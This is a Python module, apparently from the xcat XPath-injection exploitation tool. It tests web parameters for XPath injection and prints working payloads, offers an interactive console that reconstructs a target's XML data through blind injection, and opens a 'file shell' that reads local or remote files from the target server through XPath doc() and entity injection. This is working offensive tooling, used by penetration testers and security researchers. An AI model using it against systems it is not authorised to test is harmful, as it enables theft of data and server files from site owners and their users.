import asyncio
import sys

import colorama
from xcat.features.oob_http import OOBDocFeature
from .features.doc import DocFeature
from .features.entity_injection import EntityInjection
from .xpath import E, N, document_uri, doc
from .output import XMLOutput

colorama.init()


def get(executor, query, output):
    run_then_return(
        display_results(output, executor, E(query))
    )


def structure(executor, query, output):
    run_then_return(
        display_results(output, executor, E(query), simple=True)
    )


def get_uri(executor, out):
    uri = run_then_return(
        executor.get_string(document_uri(N("/")))
    )
    out.write("URI: {uri}\n".format(uri=uri))


def test(detector, target_parameter, unstable, out, use_or=False):
    if target_parameter == "*":
        params = detector.requests.get_url_parameters()
    else:
        params = [target_parameter]

    for param in params:
        out.write("Testing parameter {param}\n".format(param=param))
        detector.change_parameter(param)

        injectors = run_then_return(get_injectors(
            detector, with_features=True, unstable=unstable, use_or=use_or
        ))

        if len(injectors) == 0:
            out.write("Could not inject into parameter {param}\n".format(param=param))

        for injector, features in injectors.items():
            out.write("\t{name}\t\t{example}\n".format(name=injector.__class__.__name__, example=injector.example))
            for feature in features:
                out.write("\t\t-{name}\n".format(name=feature.__name__))
            out.write("\n")
            out.write("\tExample payloads:\n")
            for response_type, data in injector.working_requests:
                out.write("\t{type}:\t {data}\n".format(type=response_type, data=data))

            out.write("\n")


def console(executor):
    current_node = "/*[1]"

    @asyncio.coroutine
    def command_attr(node, params):
        attribute_count = yield from executor.count_nodes(node.attributes)
        attributes_result = yield from executor.get_attributes(node, attribute_count)

        if attribute_count == 0:
            print("No attributes found.")
        else:
            for name in attributes_result:
                if not name == "":
                    print("%s = %s" % (name, attributes_result[name]))

    @asyncio.coroutine
    def command_ls(node, params):
        child_node_count_result = yield from executor.count_nodes(node.children)
        print("%i child node found." % child_node_count_result)

        futures = map(asyncio.Task,
                      (executor.get_string(child.name) for child in node.children(child_node_count_result)))
        results = (yield from asyncio.gather(*futures))

        for result in results:
            print(result)

    @asyncio.coroutine
    def command_cd(node, params):
        if len(params) < 1:
            print("You must specify a node to navigate to.")
            return

        selected_node = params[0]

        # We consider anything that starts with a slash is an absolute path
        if selected_node[0] == "/":
            new_node = selected_node
        elif selected_node == "..":
            new_node = "/".join(current_node.split("/")[:-1])
        elif selected_node == ".":
            new_node = current_node
        else:
            new_node = current_node + "/" + selected_node

        if (yield from executor.is_empty_string(E(new_node).name)):
            print("Node does not exists.")
        else:
            return new_node

    @asyncio.coroutine
    def command_content(node, params):
        text_count = yield from executor.count_nodes(node.text)
        print((yield from executor.get_node_text(node, text_count)))

    @asyncio.coroutine
    def command_comment(node, params):
        comment_count = yield from executor.count_nodes(node.comments)
        print("%i comment node found." % comment_count)

        for comment in (yield from executor.get_comments(node, comment_count)):
            print("<!-- %s -->" % comment)

    @asyncio.coroutine
    def command_name(node, params):
        node_name = yield from executor.get_string(E(current_node).name)
        print(node_name)

    @asyncio.coroutine
    def command_xml(node, params):
        print("This may take some time depending on the size of the node.")
        yield from display_results(XMLOutput(sys.stdout, include_start=False), executor, node)

    commands = {
        "ls": command_ls,
        "attr": command_attr,
        "cd": command_cd,
        "content": command_content,
        "comment": command_comment,
        "name": command_name,
        "xml": command_xml
    }

    print("Warning: using cd to go to an invalid expression will cause bad things to happen.")

    while True:
        command = input("{node} : ".format(node=current_node))
        command_part = command.split(" ")
        command_name = command_part[0]
        parameters = command_part[1:]

        if command_name in commands:
            command_execution = commands[command_name](E(current_node), parameters)
            new_node = run_then_return(command_execution)

            if new_node is not None:
                current_node = new_node
        else:
            print("Unknown command")


def file_shell(requester, executor):
    print("These are the types of files you can read:")
    if requester.has_feature(EntityInjection):
        print(" * Arbitrary text files that do not contain XML, or files that do and do not contain '-->'")
    if requester.has_feature(DocFeature):
        print(" * Local XML files")
    if requester.has_feature(OOBDocFeature):
        print(" * Valid XML files available over the network")

    # ToDo: Make this more like a shell, with a current directory etc. Make it more usable :)
    print("There are three ways to read files on the file system using XPath:")
    print(" 1. doc: Reads valid XML files - does not support any other file type. Supports remote file URI's (http) and local ones.")
    print(" 2. inject: Can read arbitrary text files as long as they do not contain any XML")
    print("Type doc or inject to switch modes. Defaults to inject")
    print("Type uri to read the URI of the document being queried")
    print("Note: The URI should have a protocol prefix. Strange things may happen if the URI does not exist, and it is best to use absolute paths.")
    print("URIs like 'file:secret.txt use relative paths, URIs like 'file://secret.txt' use absolute paths. This may vary, try different combinations.")

    if requester.has_feature(EntityInjection):
        entity_injection = requester.get_feature(EntityInjection)
    else:
        entity_injection = None

    # ToDo: Make doc injection verify that the files exist
    commands = {
        "doc": lambda p: run_then_return(display_results(XMLOutput(), executor, doc(p).add_path("/*[1]")))
    }

    if entity_injection:
        commands.update({
            "inject": lambda p: print(run_then_return(entity_injection.get_file(requester, file_path)))
        })

    numbers = {
        "1": "doc",
        "2": "inject"
    }
    mode = "doc"

    while True:
        file_path = input(">> ")
        if file_path == "exit":
            sys.exit(0)

        if file_path == "uri":
            uri = run_then_return(
                executor.get_string(document_uri(N("/")))
            )
            print("URI: {}".format(uri))
        elif file_path in commands or file_path in numbers:
            if file_path in numbers:
                file_path = numbers[file_path]
            mode = file_path
            print("Switched to {}".format(mode))
        else:
            try:
                commands[mode](file_path)
            except KeyboardInterrupt:
                print("Command cancelled, CTRL+C again to terminate")
            except Exception as e:
                import traceback
                print("Error reading file. Try another mode: {0}".format(e))


@asyncio.coroutine
def display_results(output, executor, target_node, simple=False, first=True):
    if first:
        output.output_started()

    children = []
    node = yield from executor.retrieve_node(target_node, simple)
    output.output_start_node(node)

    if node.child_count > 0:
        for child in target_node.children(node.child_count):
            children.append((yield from display_results(output, executor, child, simple, first=False)))

    output.output_end_node(node)
    data = node._replace(children=children)

    if first:
        output.output_finished()

    return data


def run_then_return(generator):
    future = asyncio.Task(generator)
    asyncio.get_event_loop().run_until_complete(future)
    return future.result()


@asyncio.coroutine
def get_injectors(detector, with_features=False, unstable=False, use_or=False):
    injectors = yield from detector.detect_injectors(unstable, use_or)
    if not with_features:
        return {i: [] for i in injectors}
    # Doesn't work it seems. Shame :(
    # return{injector: (yield from detector.detect_features(injector))
    #        for injector in injectors}
    returner = {}
    for injector in injectors:
        returner[injector] = (yield from detector.detect_features(injector))
    return returner